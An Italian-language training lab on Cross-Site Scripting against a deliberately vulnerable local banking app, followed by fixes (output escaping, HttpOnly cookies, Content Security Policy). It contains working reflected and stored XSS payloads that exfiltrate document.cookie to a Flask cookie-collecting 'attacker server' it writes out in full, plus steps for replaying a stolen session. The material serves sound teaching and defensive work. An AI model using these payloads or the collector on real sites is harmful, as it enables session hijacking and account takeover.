# Laboratorio Capitolo 8 — Cross-Site Scripting (XSS)

> **Prerequisito:** Capitolo 8 della dispensa.
> **Tempo:** 90 minuti.
> **Obiettivo:** sfruttare Reflected e Stored XSS, costruire un server attaccante che raccoglie cookie di sessione, applicare le difese.

---

## Setup

Lancia `BancaPiccola-vuln` come al solito. Tieni pronti:

- due browser (o un browser con una finestra normale + una in incognito)
- un secondo terminale per il "server attaccante"

---

## Attacco 1 — Reflected XSS su `/cerca`

### Istruzioni

Vai su:

```
http://127.0.0.1:5000/cerca?q=<script>alert('XSS funzionante')</script>
```

Il browser apre un alert con il messaggio. **Hai appena eseguito del JavaScript** su una pagina di "BancaPiccola", che per il browser è codice legittimo del sito.

### Variante — manipolazione della pagina

```
http://127.0.0.1:5000/cerca?q=<script>document.body.innerHTML='<h1 style=color:red>BancaPiccola è in manutenzione. Vai su bancapiccola-secure.ml</h1>'</script>
```

La pagina si trasforma. In un attacco reale, l'attaccante redirigerebbe a un sito di phishing copia dell'originale.

---

## Attacco 2 — Costruire il server attaccante

Per dimostrare il **furto di sessione**, costruiamo un mini-server che riceve e registra i cookie esfiltrati dalla XSS.

### Server attaccante

In una cartella separata (es. `attaccante/`), crea `server-attaccante.py`:

```python
from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)
COOKIES_CATTURATI = []

@app.route("/raccolta")
def raccolta():
    cookie = request.args.get("c", "")
    timestamp = datetime.now().isoformat()
    COOKIES_CATTURATI.append({"time": timestamp, "cookie": cookie,
                               "ua": request.headers.get("User-Agent", "?")})
    print(f"\n🎯 [FURTO] {timestamp}")
    print(f"    Cookie: {cookie}")
    print(f"    User-Agent: {request.headers.get('User-Agent', '?')[:80]}\n")
    # Restituisce un pixel trasparente 1x1
    return b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;", 200, {"Content-Type": "image/gif"}

@app.route("/")
def home():
    return "<h1>Server attaccante</h1><p>In attesa di cookie...</p>"

@app.route("/bottino")
def bottino():
    return jsonify(COOKIES_CATTURATI)

if __name__ == "__main__":
    print("=" * 60)
    print("Server attaccante in ascolto su http://127.0.0.1:6666")
    print("In attesa di cookie rubati tramite XSS...")
    print("=" * 60)
    app.run(host="127.0.0.1", port=6666, debug=False)
```

Avvialo:

```bash
python server-attaccante.py
```

Ora hai `BancaPiccola-vuln` su `:5000` e il server attaccante su `:6666`.

---

## Attacco 3 — Reflected XSS con furto di sessione

### Lo scenario

Sei "l'attaccante". Hai costruito il tuo server su `127.0.0.1:6666` (in uno scenario reale sarebbe un dominio tuo su internet). Vuoi:

1. Convincere un utente di `BancaPiccola` a cliccare un link malevolo
2. Quando clicca, il suo browser esegue JavaScript che esfiltra il suo cookie al tuo server
3. Tu riusi quel cookie per autenticarti come quell'utente

### URL malevolo

Il link che invieresti alla vittima via email/SMS/chat:

```
http://127.0.0.1:5000/cerca?q=<script>new Image().src='http://127.0.0.1:6666/raccolta?c='+encodeURIComponent(document.cookie)</script>
```

### Simulazione

1. Apri il browser, **fai login come Mario**
2. Copia l'URL malevolo nella barra del browser e premi Invio
3. Guarda il terminale del **server attaccante**: dovresti vedere il cookie di sessione di Mario:

   ```
   🎯 [FURTO] 2025-10-15T18:42:33
       Cookie: session=eyJydW9sbyI6ImNsaWVudGUiLCJ1dGVudGVfaWQiOjIsInVzZXJuYW1l...
   ```

4. **Copia il valore di `session=...`**

### Impersonare la vittima

Apri un browser in **incognito** (nuova sessione, senza cookie). Installa l'estensione [Cookie Editor](https://chrome.google.com/webstore/detail/cookie-editor) (disponibile per Chrome e Firefox).

1. Vai su `http://127.0.0.1:5000` nel browser incognito
2. Clicca sull'icona Cookie Editor
3. Aggiungi un cookie: `name=session, value=<quello rubato>, path=/`
4. Ricarica la pagina

**Sei loggato come Mario.** Non hai inserito né username né password. Hai il cookie di Mario, che per il server equivale alle sue credenziali.

---

## Attacco 4 — Stored XSS: colpire tutti gli utenti

La Reflected XSS richiede che ogni vittima clicchi un link specifico. La **Stored XSS** è molto più pericolosa: il payload viene **salvato sul server** e colpisce **chiunque visiti la pagina**.

### Istruzioni

1. Fai login come Mario
2. Vai su `http://127.0.0.1:5000/prodotto/1` (Conto Base)
3. Nel form dei commenti, inserisci:

   ```
   Ottimo prodotto!
   <script>new Image().src='http://127.0.0.1:6666/raccolta?c='+encodeURIComponent(document.cookie)</script>
   ```

4. Clicca "Pubblica". Il commento viene salvato nel database con lo script dentro
5. Esci (`/logout`)

### L'esca è armata

Ora simula **un altro utente** che visita la stessa pagina:

1. Apri un browser in incognito
2. Fai login come **Giulia** (`giulia` / `giulia2025`)
3. Vai su `http://127.0.0.1:5000/prodotto/1`
4. Guarda il terminale del server attaccante

**Il cookie di Giulia arriva al server attaccante**, senza che Giulia abbia fatto nulla di sospetto. Ha solo aperto la pagina di un prodotto della banca.

Ripeti con Luca, con l'admin: ogni singolo visitatore che vede la pagina **esegue lo script**, **perde il cookie**. In una banca reale con migliaia di utenti al giorno, l'attaccante in 24 ore raccoglie migliaia di sessioni attive.

---

## Correzione

Apri `BancaPiccola-vuln/app.py`.

### Punto 1 — rimozione di `| safe`

In `cerca()`, trova:

```html
<h2>Risultati per "{{ q | safe }}"</h2>
```

Sostituisci con:

```html
<h2>Risultati per "{{ q }}"</h2>
```

In `prodotto()`, trova:

```html
{{ c['testo'] | safe }}
```

Sostituisci con:

```html
{{ c['testo'] }}
```

Jinja2 ora fa escape automatico dei caratteri HTML speciali (`<`, `>`, `&`, `"`).

### Punto 2 — cookie di sessione con HttpOnly + SameSite

Dopo `app = Flask(__name__)`, aggiungi:

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,   # JavaScript non legge il cookie
    SESSION_COOKIE_SAMESITE="Lax",  # base anti-CSRF
    # SESSION_COOKIE_SECURE=True,   # solo in HTTPS (da attivare in produzione)
)
```

Con `HttpOnly=True`, anche se rimane una XSS, lo script `document.cookie` non restituisce il cookie di sessione. **Difesa in profondità.**

### Punto 3 — Content Security Policy

Aggiungi prima dell'`if __name__ == "__main__":`:

```python
@app.after_request
def aggiungi_header_sicurezza(response):
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "script-src 'self'; "
        "object-src 'none'; "
        "base-uri 'self'; "
        "frame-ancestors 'none';"
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    return response
```

La CSP dice al browser: *"esegui solo script provenienti dal mio dominio, mai inline"*. Anche se un attaccante riesce a iniettare uno `<script>` inline, il browser si rifiuta di eseguirlo.

### Verifica

Rilancia l'app. Riprova gli attacchi:

1. URL malevolo `/cerca?q=<script>...</script>` → lo script appare come testo normale nella pagina, non viene eseguito
2. Commento con `<script>...</script>` → salvato come testo, mostrato letteralmente, niente script attivo
3. Anche se la XSS passasse: il cookie di sessione non è accessibile da JavaScript (HttpOnly)
4. Anche se il cookie fosse accessibile: la CSP blocca script da domini esterni

**Difesa a 4 livelli, tutti attivi insieme.**

---

## Domande di riflessione

1. Perché l'escape automatico di Jinja2 è una difesa "strutturale" e filtrare `<script>` con regex non lo è? Fai un esempio di payload XSS che non contiene il tag `<script>`.
2. Quando serve disabilitare l'escape di Jinja2 (`| safe`)? Fai un esempio di uso legittimo.
3. La **Same-Origin Policy** del browser dovrebbe impedire al codice di `bancapiccola.it` di fare richieste a `attaccante.it`. Perché invece nell'attacco del §3 il cookie arriva comunque?
4. In un'applicazione Single-Page (React, Vue, Angular), dove si fa l'escape automatico? Quali sono le "scappatoie" pericolose (una per framework)?
